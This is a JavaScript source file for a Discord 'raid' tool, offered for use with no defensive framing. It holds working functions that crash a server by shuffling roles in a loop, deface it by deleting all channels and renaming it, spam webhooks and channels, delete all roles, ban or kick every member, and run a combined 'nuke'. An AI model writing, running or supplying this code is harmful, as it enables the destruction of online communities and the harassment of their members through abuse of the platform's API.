const raidModule = {
    showPruneModal() {
        ui.showModal(`
            <h2>🧹 Prune Members</h2>
            <p>Deletes members inactive for 7 days</p>
            <input type="text" id="prune-server-id" placeholder="Server ID" />
            <button onclick="raidModule.pruneMembers()" class="danger-btn">Prune</button>
        `);
    },

    async pruneMembers() {
        const serverId = document.getElementById('prune-server-id').value.trim();
        if (!serverId) {
            alert('Please enter a server ID');
            return;
        }

        if (!confirm('⚠️ Prune inactive members (7 days)?')) return;

        ui.closeModal();

        try {
            log('Launching prune...', 'warning');
            
            const result = await discordFetch(`/guilds/${serverId}/prune`, {
                method: 'POST',
                body: JSON.stringify({ days: 7 })
            });
            
            log(`✅ ${result.pruned || 0} inactive members pruned`, 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    showRoleUpModal() {
        ui.showModal(`
            <h2>🔄 Role Up Crash</h2>
            <p>Crashes a server by moving roles in a loop</p>
            <input type="text" id="roleup-server-id" placeholder="Server ID" />
            <button onclick="raidModule.startRoleUpCrash()" class="danger-btn">Start</button>
            <button onclick="raidModule.stopRoleUpCrash()" class="danger-btn">Stop</button>
        `);
    },

    roleUpIntervals: {},

    async startRoleUpCrash() {
        const serverId = document.getElementById('roleup-server-id').value.trim();
        if (!serverId) {
            alert('Please enter a server ID');
            return;
        }

        if (this.roleUpIntervals[serverId]) {
            log('❌ A crash is already active on this server', 'error');
            return;
        }

        if (!confirm('⚠️ START ROLE UP CRASH?')) return;

        ui.closeModal();

        try {
            log('🔄 BEGINNING ROLE UP CRASH', 'warning');
            
            const crashRoles = async () => {
                try {
                    const roles = await discordFetch(`/guilds/${serverId}/roles`);
                    
                    const editableRoles = roles.filter(role => role.name !== '@everyone' && !role.managed);
                    
                    const shuffled = editableRoles.map(role => ({
                        id: role.id,
                        position: Math.floor(Math.random() * editableRoles.length) + 1
                    }));
                    
                    await discordFetchNoError(`/guilds/${serverId}/roles`, {
                        method: 'PATCH',
                        body: JSON.stringify(shuffled)
                    });
                    
                    log('✓ Roles moved', 'success');
                } catch (error) {
                    log(`✗ Error: ${error.message}`, 'error');
                }
            };

            crashRoles();
            this.roleUpIntervals[serverId] = setInterval(crashRoles, 1000);
            
            log('🔄 ROLE UP CRASH ACTIVE', 'warning');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    stopRoleUpCrash() {
        const serverId = document.getElementById('roleup-server-id').value.trim();
        if (!serverId) {
            alert('Please enter a server ID');
            return;
        }

        if (!this.roleUpIntervals[serverId]) {
            log('❌ No active crash on this server', 'error');
            return;
        }

        clearInterval(this.roleUpIntervals[serverId]);
        delete this.roleUpIntervals[serverId];
        
        log('✅ ROLE UP CRASH STOPPED', 'success');
        ui.closeModal();
    },

    showDefaceModal() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) {
            alert('Please enter a server ID');
            return;
        }
        
        ui.showModal(`
            <h2>🔥 Deface Server</h2>
            <p>Deletes all channels, creates a "deface" channel, and renames the server</p>
            <input type="text" id="deface-server-id" value="${serverId}" placeholder="Server ID" />
            <input type="text" id="deface-server-name" placeholder="New server name" value="DEFACED" />
            <input type="text" id="deface-channel-name" placeholder="Channel name" value="deface" />
            <button onclick="raidModule.executeDeface()" class="danger-btn">🔥 Execute Deface</button>
        `);
    },

    async executeDeface() {
        const serverId = document.getElementById('deface-server-id').value.trim();
        const serverName = document.getElementById('deface-server-name').value.trim();
        const channelName = document.getElementById('deface-channel-name').value.trim();
        
        if (!confirm('⚠️ DEFACE THIS SERVER?')) return;
        
        ui.closeModal();
        
        try {
            log('🔥 BEGINNING DEFACE', 'warning');
            
            log('Rapid channel deletion...', 'warning');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            
            channels.forEach(channel => 
                discordFetchNoError(`/channels/${channel.id}`, { method: 'DELETE' })
                    .then(() => log(`✓ Channel deleted: ${channel.name}`, 'success'))
            );
            
            log('Renaming server...', 'warning');
            discordFetchNoError(`/guilds/${serverId}`, {
                method: 'PATCH',
                body: JSON.stringify({ name: serverName })
            }).then(() => log(`✓ Server renamed: ${serverName}`, 'success'));
            
            log('Creating deface channel...', 'warning');
            discordFetchNoError(`/guilds/${serverId}/channels`, {
                method: 'POST',
                body: JSON.stringify({ name: channelName, type: 0 })
            }).then(() => log(`✓ Channel created: ${channelName}`, 'success'));
            
            log('🔥 DEFACE FINISHED', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    showWebhookSpamModal() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) {
            alert('Please enter a server ID');
            return;
        }
        
        ui.showModal(`
            <h2>📢 Webhook Spam</h2>
            <p>Creates 2 webhooks per channel and spams with a message</p>
            <input type="text" id="webhook-server-id" value="${serverId}" placeholder="Server ID" />
            <textarea id="webhook-message" rows="3" placeholder="Spam message">RAIDED</textarea>
            <input type="number" id="webhook-spam-count" placeholder="Number of messages per webhook" value="10" />
            <button onclick="raidModule.executeWebhookSpam()" class="danger-btn">📢 Execute Spam</button>
        `);
    },

    async executeWebhookSpam() {
        const serverId = document.getElementById('webhook-server-id').value.trim();
        const message = document.getElementById('webhook-message').value.trim();
        const spamCount = parseInt(document.getElementById('webhook-spam-count').value) || 10;
        
        if (!confirm('⚠️ SPAM WEBHOOKS?')) return;
        
        ui.closeModal();
        
        try {
            log('📢 BEGINNING WEBHOOK SPAM', 'warning');
            
            log('Fetching channels...', 'info');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            const textChannels = channels.filter(c => c.type === 0);
            
            log(`Creating webhooks in ${textChannels.length} channels...`, 'warning');
            
            const webhooks = [];
            
            for (const channel of textChannels) {
                const webhook1 = await discordFetchNoError(`/channels/${channel.id}/webhooks`, {
                    method: 'POST',
                    body: JSON.stringify({ name: 'raided' })
                });
                
                if (webhook1) {
                    webhooks.push(webhook1);
                    log(`✓ Webhook created in ${channel.name}`, 'success');
                    
                    for (let i = 0; i < spamCount; i++) {
                        await fetch(`https://discord.com/api/webhooks/${webhook1.id}/${webhook1.token}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: message })
                        }).catch(() => {});
                    }
                }
                
                const webhook2 = await discordFetchNoError(`/channels/${channel.id}/webhooks`, {
                    method: 'POST',
                    body: JSON.stringify({ name: 'raided' })
                });
                
                if (webhook2) {
                    webhooks.push(webhook2);
                    
                    for (let i = 0; i < spamCount; i++) {
                        await fetch(`https://discord.com/api/webhooks/${webhook2.id}/${webhook2.token}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: message })
                        }).catch(() => {});
                    }
                }
            }
            
            log('📢 WEBHOOK SPAM LAUNCHED', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    async spamChannels() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) return alert('Please enter a server ID');
        
        const count = prompt('How many channels to create?', '50');
        if (!count) return;
        
        try {
            log(`Creating ${count} channels...`, 'warning');
            
            for (let i = 0; i < parseInt(count); i++) {
                await discordFetchNoError(`/guilds/${serverId}/channels`, {
                    method: 'POST',
                    body: JSON.stringify({ name: `raided-${i}`, type: 0 })
                });
                log(`✓ Channel ${i + 1}/${count} created`, 'success');
            }
            
            log('✅ Channel spam finished', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    async spamRoles() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) return alert('Please enter a server ID');
        
        const count = prompt('How many roles to create?', '50');
        if (!count) return;
        
        try {
            log(`Creating ${count} roles...`, 'warning');
            
            for (let i = 0; i < parseInt(count); i++) {
                await discordFetchNoError(`/guilds/${serverId}/roles`, {
                    method: 'POST',
                    body: JSON.stringify({
                        name: `raided-${i}`,
                        color: Math.floor(Math.random() * 16777215)
                    })
                });
                log(`✓ Role ${i + 1}/${count} created`, 'success');
            }
            
            log('✅ Role spam finished', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    async deleteChannels() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Please enter a server ID');
        
        if (!confirm('⚠️ DELETE ALL CHANNELS?')) return;
        
        try {
            log('Fetching channels...', 'warning');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            
            log(`Rapid deletion of ${channels.length} channels...`, 'warning');
            
            channels.forEach(channel => 
                discordFetchNoError(`/channels/${channel.id}`, { method: 'DELETE' })
                    .then(() => log(`✓ Channel deleted: ${channel.name}`, 'success'))
            );
            
            log('✅ Channel deletion launched', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    async deleteRoles() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Please enter a server ID');
        
        if (!confirm('⚠️ DELETE ALL ROLES?')) return;
        
        try {
            log('Fetching roles...', 'warning');
            const roles = await discordFetch(`/guilds/${serverId}/roles`);
            
            log(`Deleting ${roles.length} roles...`, 'warning');
            
            roles.forEach(role => {
                if (!role.managed && role.name !== '@everyone') {
                    discordFetchNoError(`/guilds/${serverId}/roles/${role.id}`, { method: 'DELETE' })
                        .then(() => log(`✓ Role deleted: ${role.name}`, 'success'));
                }
            });
            
            log('✅ Role deletion launched', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    async banAll() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Please enter a server ID');
        
        if (!confirm('⚠️ BAN ALL MEMBERS?')) return;
        
        try {
            log('Fetching members...', 'warning');
            let members = [];
            let after = '0';
            
            while (true) {
                const batch = await discordFetch(`/guilds/${serverId}/members?limit=1000&after=${after}`);
                if (batch.length === 0) break;
                members = members.concat(batch);
                after = batch[batch.length - 1].user.id;
            }
            
            log(`Banning ${members.length} members...`, 'warning');
            
            members.forEach(member => {
                if (member.user.id !== userData.id) {
                    discordFetchNoError(`/guilds/${serverId}/bans/${member.user.id}`, {
                        method: 'PUT',
                        body: JSON.stringify({ delete_message_days: 7 })
                    }).then(() => log(`✓ Banned: ${member.user.username}`, 'success'));
                }
            });
            
            log('✅ Banning launched', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    async kickAll() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Please enter a server ID');
        
        if (!confirm('⚠️ KICK ALL MEMBERS?')) return;
        
        try {
            log('Fetching members...', 'warning');
            let members = [];
            let after = '0';
            
            while (true) {
                const batch = await discordFetch(`/guilds/${serverId}/members?limit=1000&after=${after}`);
                if (batch.length === 0) break;
                members = members.concat(batch);
                after = batch[batch.length - 1].user.id;
            }
            
            log(`Kicking ${members.length} members...`, 'warning');
            
            members.forEach(member => {
                if (member.user.id !== userData.id) {
                    discordFetchNoError(`/guilds/${serverId}/members/${member.user.id}`, { method: 'DELETE' })
                        .then(() => log(`✓ Kicked: ${member.user.username}`, 'success'));
                }
            });
            
            log('✅ Kick launched', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    },

    async nuke() {
        const serverId = document.getElementById('raid-server-id-3').value.trim();
        if (!serverId) return alert('Please enter a server ID');
        
        if (!confirm('⚠️⚠️⚠️ COMPLETE SERVER NUKE? EVERYTHING WILL BE DESTROYED! ⚠️⚠️⚠️')) return;
        if (!confirm('Last confirmation: ARE YOU ABSOLUTELY SURE?')) return;
        
        try {
            log('☢️ NUKE BEGINNING ☢️', 'error');
            
            log('Deleting channels...', 'warning');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            channels.forEach(channel => 
                discordFetchNoError(`/channels/${channel.id}`, { method: 'DELETE' })
                    .then(() => log(`✓ Channel deleted: ${channel.name}`, 'success'))
            );
            
            log('Deleting roles...', 'warning');
            const roles = await discordFetch(`/guilds/${serverId}/roles`);
            roles.forEach(role => {
                if (!role.managed && role.name !== '@everyone') {
                    discordFetchNoError(`/guilds/${serverId}/roles/${role.id}`, { method: 'DELETE' })
                        .then(() => log(`✓ Role deleted: ${role.name}`, 'success'));
                }
            });
            
            log('Creating spam channels...', 'warning');
            for (let i = 0; i < 50; i++) {
                await discordFetchNoError(`/guilds/${serverId}/channels`, {
                    method: 'POST',
                    body: JSON.stringify({ name: `nuked-${i}`, type: 0 })
                });
            }
            
            log('Banning members...', 'warning');
            let members = [];
            let after = '0';
            while (members.length < 50) {
                const batch = await discordFetchNoError(`/guilds/${serverId}/members?limit=50&after=${after}`);
                if (!batch || batch.length === 0) break;
                members = members.concat(batch);
                after = batch[batch.length - 1].user.id;
            }
            
            members.slice(0, 50).forEach(member => {
                if (member.user.id !== userData.id) {
                    discordFetchNoError(`/guilds/${serverId}/bans/${member.user.id}`, {
                        method: 'PUT',
                        body: JSON.stringify({ delete_message_days: 7 })
                    });
                }
            });
            
            log('☢️ NUKE LAUNCHED ☢️', 'error');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    }
};
